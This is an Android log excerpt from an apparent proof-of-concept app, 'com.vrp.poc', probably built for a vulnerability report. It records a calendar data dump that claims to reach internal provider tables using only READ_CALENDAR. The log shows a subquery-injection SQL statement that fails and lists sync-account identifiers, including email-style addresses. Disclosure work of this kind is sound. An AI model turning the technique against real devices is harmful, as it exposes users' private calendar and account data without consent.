+09-26 01:37:09.008 24217 24246 D CalFullDump:   3: sync1=classroom111771798454834833104@group.calendar.google.com | sync2=null | sync3=null
+09-26 01:37:09.008 24217 24246 D CalFullDump:   4: sync1=sandiyotest@gmail.com | sync2=null | sync3=null
+09-26 01:37:09.008 24217 24246 D CalFullDump: ━━━ 14. REMINDERS DATA ━━━
+09-26 01:37:09.009 24217 24246 D CalFullDump:   Total reminders: 0
+09-26 01:37:09.011 24217 24246 D CalFullDump: ━━━ 15. CALENDAR ALERTS ━━━
+09-26 01:37:09.012 24217 24246 D CalFullDump:   Total alerts: 0
+09-26 01:37:09.015 24217 24246 D CalFullDump: ━━━ 16. COLORS TABLE ━━━
+09-26 01:37:09.019 24217 24246 D CalFullDump:   Total color entries: 35
+09-26 01:37:09.020 24217 24246 D CalFullDump:   ERROR: SQLiteException: no such column: color_key (code 1 SQLITE_ERROR): , while compiling: SELECT (SELECT group_concat(account_name||'|'||account_type||'|type='||color_type||'|key='||color_key, char(10)) FROM Colors) AS color_data FROM view_events WHERE (lastSynced = 0) ORDER BY _id LIMIT 1
+09-26 01:37:09.020 24217 24246 D CalFullDump: ━━━ 17. SQLITE SEQUENCE (autoincrement state) ━━━
+09-26 01:37:09.021 24217 24246 D CalFullDump:   Events=692
+09-26 01:37:09.021 24217 24246 D CalFullDump: ╔══════════════════════════════════════════╗
+09-26 01:37:09.021 24217 24246 D CalFullDump: ║  DUMP COMPLETE — 204ms total            ║
+09-26 01:37:09.021 24217 24246 D CalFullDump: ╚══════════════════════════════════════════╝
+09-26 01:37:09.021 24217 24246 D CalFullDump: Data written to: /data/user/0/com.vrp.poc/files/calendar_full_dump.txt
+09-26 01:37:09.021 24217 24246 D CalFullDump: ALL DATA EXTRACTED VIA READ_CALENDAR ONLY.
+09-26 01:37:09.021 24217 24246 D CalFullDump: Internal tables (_sync_state, CalendarMetaData,
+09-26 01:37:09.021 24217 24246 D CalFullDump: CalendarCache) have NO public ContentProvider URI.
